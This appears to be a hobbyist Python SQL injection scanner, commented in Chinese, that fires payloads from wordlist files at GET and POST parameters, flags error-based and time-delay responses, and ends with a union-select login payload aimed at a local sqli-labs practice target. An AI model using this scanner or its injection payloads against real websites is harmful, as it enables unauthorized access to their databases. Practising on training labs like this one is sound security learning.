#!/usr/bin/env python
# -*- coding: UTF-8 -*-
"""
@Project ：python_self 
@File    ：scan_web_sql.py
@Author  ：CZ   
@Date    ：2023/7/13 14:57 
@脚本说明：sql注入脚本
"""

import requests
import time
from datetime import datetime

class ScanSql:
    # 类的基本属性
    def __init__(self, url):
        self.url = url
    def __str__(self):
        return "您输入的url地址是[%s],现在开始扫描" % self.url
    # 定义类的方法
    def sql_get(self):
        # 切分字符串，取出我们的url以及我们的payload
        url_list = self.url.split('?')
        my_url = url_list[0]
        my_datas = url_list[1].split("&")
        my_data_dirt = {}

        # 遍获取到字典的内容
        with open('./conf/sql_inject.txt',)as file:
            payload_list = file.readlines()
        # 遍历我们的字典内容
        for payload in payload_list:
            payload = payload.strip()

            # 写入payload数据
            for data in my_datas:
                data_list = data.split("=", 1)
                my_data_dirt[data_list[0]] = payload

            resp = requests.get(url=my_url, params=my_data_dirt)
            sign = 'SQL syntax'
            if sign in resp.text:
                print(f"有sql注入的漏洞，payload为{payload}")
            else:
                print("没有正常注入的漏洞")

    def scan_url_boolblind(self):
        # time1 = datetime.now()
        # print(time1)
        # 切分字符串，取出我们的url以及我们的payload
        my_url = self.url.split('?')[0]
        my_param = self.url.split('?')[1].split('=')[0]
        # print(my_url)
        # print(my_param)
        # 遍获取到字典的内容
        with open('./conf/sql_boolblind.txt',)as file:
            payload_list = file.readlines()
        # 遍历我们的字典内容
        for payload in payload_list:
            payload = payload.strip()
            my_url = my_url + '?' + my_param + '=' + payload
            # print(my_url)
            # resp = requests.get(url=my_url, params={my_param: payload})
            time1 = time.time()
            resp = requests.get(url=my_url)
            # print(payload)
            # print(resp.text)
            time2 = time.time()
            # print(time2)
            result = time2-time1
            # print(result)
            if result > 2:
                print(f"有布尔盲注的漏洞，payload为{payload}")


    def sql_post(self, str):
        if '?' in self.url:
            post_url = self.url.split('?')[0]
        else:
            post_url = self.url
        print(post_url)

        with open('./conf/sql_boolblind.txt',)as file:
            payload_list = file.readlines()
            for payload in payload_list:
                payload = payload.strip()
                post_list = str.split("&")
                post_dirt = {}
                for i in post_list:
                    # post_dirt[i.split("=", 1)[0]] = i.split("=", 1)[1]
                    post_dirt[i.split("=", 1)[0]] = payload
                    resp = requests.post(url=post_url, data=post_dirt)
                    # sign = 'SQL'
                    sign = payload
                    print(sign)
                    print(resp.text)
                if sign in resp.text:
                    print(f"有sql注入的漏洞，payload为{payload}")
                else:
                     print("没有正常注入的漏洞")


if __name__ == '__main__':

    my_scan = ScanSql('http://192.168.35.131/crm17/sqli-labs-master/Less-11/?id=test')
    my_scan.sql_post("uname=x' union select database(),2#&passwd=213213&submit=Submit")
